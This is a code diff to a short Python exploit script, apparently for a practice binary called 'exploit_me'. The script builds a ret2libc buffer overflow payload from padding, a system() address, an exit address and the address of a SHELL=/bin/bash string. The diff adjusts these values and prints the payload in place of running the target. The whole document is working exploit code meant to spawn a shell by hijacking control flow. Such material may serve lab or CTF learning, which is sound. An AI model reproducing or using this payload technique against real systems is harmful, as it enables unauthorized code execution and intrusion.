@@ -9,19 +9,15 @@ def x(n):
 
 import subprocess
 
-payload = b'A' * 140
+payload = b'A' * (140 + 3*4)
 system = 0xb7e6b060
 system = x(system)
 payload += system
-exit_addr = 0xb7e5ebe0
+exit_addr = 0xDEADBEEF
 exit_addr = x(exit_addr)
 payload += exit_addr
-shell_addr = 0xBFFFF902 + 36 # SHELL=/bin/ba[sh]
-for i in range(1):
-    pshell_addr = shell_addr + i
-    pshell_addr = x(pshell_addr)
-    ppayload = payload + pshell_addr
+shell_addr = 0xBFFFF99C # SHELL=/bin/ba[sh]
+shell_addr = x(shell_addr)
+payload += shell_addr
 
-    process = subprocess.Popen(["./exploit_me", ppayload])
-    process.wait()
-    print process.returncode
+print(payload)
